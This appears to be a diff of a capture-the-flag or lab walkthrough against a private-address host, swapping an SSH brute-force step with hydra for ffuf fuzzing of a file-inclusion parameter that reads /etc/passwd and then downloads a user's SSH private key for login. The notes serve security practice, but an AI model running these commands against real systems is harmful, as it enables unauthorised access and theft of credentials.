@@ -22,6 +22,25 @@
 
     Results: /secret/evil.php
 
-5. hydra
+5. ffuf
 
-    hydra -t4 -l H4x0r -P rockyou.txt ssh://10.10.20.50
+    ffuf -u http://10.10.20.50/secret/evil.php?FUZZ=/etc/passwd -w directory-list-2.3-small.txt -fs 0
+
+5. URL
+
+    http://10.10.20.50/secret.evil.php?FUZZ=/etc/passwd
+
+    user: mowree
+
+6. password
+
+    http://10.10.20.50/secret.evil.php?FUZZ=/home/mowree/.ssh/id_rsa
+
+    wget http://10.10.20.50/secret.evil.php?FUZZ=/home/mowree/.ssh/id_rsa -O key
+
+7. chmod "key"
+
+    chmod 600 key
+
+8. ssh
+
